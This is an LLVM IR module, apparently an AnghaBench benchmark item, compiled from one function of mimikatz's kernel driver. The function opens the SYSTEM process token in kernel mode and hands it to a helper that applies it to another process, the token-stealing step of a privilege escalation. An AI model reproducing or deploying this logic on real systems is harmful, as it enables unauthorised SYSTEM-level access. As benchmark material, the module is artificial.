; ModuleID = '/home/carl/AnghaBench/mimikatz/mimidrv/extr_kkll_m_process.c_kkll_m_process_token.c'
source_filename = "/home/carl/AnghaBench/mimikatz/mimidrv/extr_kkll_m_process.c_kkll_m_process_token.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i64, i64 }

@STATUS_SUCCESS = common dso_local global i32 0, align 4
@PsInitialSystemProcess = common dso_local global i64 0, align 8
@OBJ_KERNEL_HANDLE = common dso_local global i32 0, align 4
@PsProcessType = common dso_local global i32* null, align 8
@KernelMode = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [21 x i32] [i32 84, i32 111, i32 107, i32 101, i32 110, i32 32, i32 102, i32 114, i32 111, i32 109, i32 32, i32 37, i32 117, i32 47, i32 37, i32 45, i32 49, i32 52, i32 83, i32 10, i32 0], align 4
@kkll_m_process_systoken_callback = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @kkll_m_process_token(i32 %0, i32 %1, i32 %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.TYPE_2__*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i64, align 8
  %14 = alloca i64, align 8
  store i32 %0, i32* %4, align 4
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %15 = load i32, i32* @STATUS_SUCCESS, align 4
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = inttoptr i64 %17 to %struct.TYPE_2__*
  store %struct.TYPE_2__* %18, %struct.TYPE_2__** %8, align 8
  %19 = load i64, i64* @PsInitialSystemProcess, align 8
  store i64 %19, i64* %13, align 8
  store i64 0, i64* %14, align 8
  %20 = load %struct.TYPE_2__*, %struct.TYPE_2__** %8, align 8
  %21 = icmp ne %struct.TYPE_2__* %20, null
  br i1 %21, label %22, label %53

22:                                               ; preds = %3
  %23 = load i32, i32* %4, align 4
  %24 = sext i32 %23 to i64
  %25 = icmp eq i64 %24, 4
  br i1 %25, label %26, label %53

26:                                               ; preds = %22
  %27 = load %struct.TYPE_2__*, %struct.TYPE_2__** %8, align 8
  %28 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %27, i32 0, i32 1
  %29 = load i64, i64* %28, align 8
  %30 = icmp ne i64 %29, 0
  br i1 %30, label %31, label %37

31:                                               ; preds = %26
  %32 = load %struct.TYPE_2__*, %struct.TYPE_2__** %8, align 8
  %33 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %32, i32 0, i32 1
  %34 = load i64, i64* %33, align 8
  %35 = trunc i64 %34 to i32
  %36 = call i32 @PsLookupProcessByProcessId(i32 %35, i64* %13)
  store i32 %36, i32* %7, align 4
  br label %37

37:                                               ; preds = %31, %26
  %38 = load i32, i32* %7, align 4
  %39 = call i64 @NT_SUCCESS(i32 %38)
  %40 = icmp ne i64 %39, 0
  br i1 %40, label %41, label %52

41:                                               ; preds = %37
  %42 = load %struct.TYPE_2__*, %struct.TYPE_2__** %8, align 8
  %43 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %42, i32 0, i32 0
  %44 = load i64, i64* %43, align 8
  %45 = icmp ne i64 %44, 0
  br i1 %45, label %46, label %52

46:                                               ; preds = %41
  %47 = load %struct.TYPE_2__*, %struct.TYPE_2__** %8, align 8
  %48 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %47, i32 0, i32 0
  %49 = load i64, i64* %48, align 8
  %50 = trunc i64 %49 to i32
  %51 = call i32 @PsLookupProcessByProcessId(i32 %50, i64* %14)
  store i32 %51, i32* %7, align 4
  br label %52

52:                                               ; preds = %46, %41, %37
  br label %53

53:                                               ; preds = %52, %22, %3
  %54 = load i32, i32* %7, align 4
  %55 = call i64 @NT_SUCCESS(i32 %54)
  %56 = icmp ne i64 %55, 0
  br i1 %56, label %57, label %109

57:                                               ; preds = %53
  %58 = load i64, i64* %13, align 8
  %59 = load i32, i32* @OBJ_KERNEL_HANDLE, align 4
  %60 = load i32*, i32** @PsProcessType, align 8
  %61 = load i32, i32* %60, align 4
  %62 = load i32, i32* @KernelMode, align 4
  %63 = call i32 @ObOpenObjectByPointer(i64 %58, i32 %59, i32* null, i32 0, i32 %61, i32 %62, i32* %11)
  store i32 %63, i32* %7, align 4
  %64 = load i32, i32* %7, align 4
  %65 = call i64 @NT_SUCCESS(i32 %64)
  %66 = icmp ne i64 %65, 0
  br i1 %66, label %67, label %108

67:                                               ; preds = %57
  %68 = load i32, i32* %11, align 4
  %69 = load i32, i32* @OBJ_KERNEL_HANDLE, align 4
  %70 = call i32 @ZwOpenProcessTokenEx(i32 %68, i32 0, i32 %69, i32* %12)
  store i32 %70, i32* %7, align 4
  %71 = load i32, i32* %7, align 4
  %72 = call i64 @NT_SUCCESS(i32 %71)
  %73 = icmp ne i64 %72, 0
  br i1 %73, label %74, label %105

74:                                               ; preds = %67
  %75 = load i32, i32* %6, align 4
  %76 = load i64, i64* %13, align 8
  %77 = call i32 @PsGetProcessId(i64 %76)
  %78 = load i64, i64* %13, align 8
  %79 = call i32 @PsGetProcessImageFileName(i64 %78)
  %80 = call i32 @kprintf(i32 %75, i8* bitcast ([21 x i32]* @.str to i8*), i32 %77, i32 %79)
  store i32 %80, i32* %7, align 4
  %81 = load i32, i32* %7, align 4
  %82 = call i64 @NT_SUCCESS(i32 %81)
  %83 = icmp ne i64 %82, 0
  br i1 %83, label %84, label %102

84:                                               ; preds = %74
  %85 = load i64, i64* %14, align 8
  %86 = icmp ne i64 %85, 0
  br i1 %86, label %87, label %94

87:                                               ; preds = %84
  %88 = load i32, i32* %4, align 4
  %89 = load i32, i32* %5, align 4
  %90 = load i32, i32* %6, align 4
  %91 = load i32, i32* %12, align 4
  %92 = load i64, i64* %14, align 8
  %93 = call i32 @kkll_m_process_token_toProcess(i32 %88, i32 %89, i32 %90, i32 %91, i64 %92)
  store i32 %93, i32* %7, align 4
  br label %101

94:                                               ; preds = %84
  %95 = load i32, i32* %4, align 4
  %96 = load i32, i32* %5, align 4
  %97 = load i32, i32* %6, align 4
  %98 = load i32, i32* @kkll_m_process_systoken_callback, align 4
  %99 = load i32, i32* %12, align 4
  %100 = call i32 @kkll_m_process_enum(i32 %95, i32 %96, i32 %97, i32 %98, i32 %99)
  store i32 %100, i32* %7, align 4
  br label %101

101:                                              ; preds = %94, %87
  br label %102

102:                                              ; preds = %101, %74
  %103 = load i32, i32* %12, align 4
  %104 = call i32 @ZwClose(i32 %103)
  br label %105

105:                                              ; preds = %102, %67
  %106 = load i32, i32* %11, align 4
  %107 = call i32 @ZwClose(i32 %106)
  br label %108

108:                                              ; preds = %105, %57
  br label %109

109:                                              ; preds = %108, %53
  %110 = load i64, i64* %14, align 8
  %111 = icmp ne i64 %110, 0
  br i1 %111, label %112, label %115

112:                                              ; preds = %109
  %113 = load i64, i64* %14, align 8
  %114 = call i32 @ObDereferenceObject(i64 %113)
  br label %115

115:                                              ; preds = %112, %109
  %116 = load i64, i64* %13, align 8
  %117 = icmp ne i64 %116, 0
  br i1 %117, label %118, label %125

118:                                              ; preds = %115
  %119 = load i64, i64* %13, align 8
  %120 = load i64, i64* @PsInitialSystemProcess, align 8
  %121 = icmp ne i64 %119, %120
  br i1 %121, label %122, label %125

122:                                              ; preds = %118
  %123 = load i64, i64* %13, align 8
  %124 = call i32 @ObDereferenceObject(i64 %123)
  br label %125

125:                                              ; preds = %122, %118, %115
  %126 = load i32, i32* %7, align 4
  ret i32 %126
}

declare dso_local i32 @PsLookupProcessByProcessId(i32, i64*) #1

declare dso_local i64 @NT_SUCCESS(i32) #1

declare dso_local i32 @ObOpenObjectByPointer(i64, i32, i32*, i32, i32, i32, i32*) #1

declare dso_local i32 @ZwOpenProcessTokenEx(i32, i32, i32, i32*) #1

declare dso_local i32 @kprintf(i32, i8*, i32, i32) #1

declare dso_local i32 @PsGetProcessId(i64) #1

declare dso_local i32 @PsGetProcessImageFileName(i64) #1

declare dso_local i32 @kkll_m_process_token_toProcess(i32, i32, i32, i32, i64) #1

declare dso_local i32 @kkll_m_process_enum(i32, i32, i32, i32, i32) #1

declare dso_local i32 @ZwClose(i32) #1

declare dso_local i32 @ObDereferenceObject(i64) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
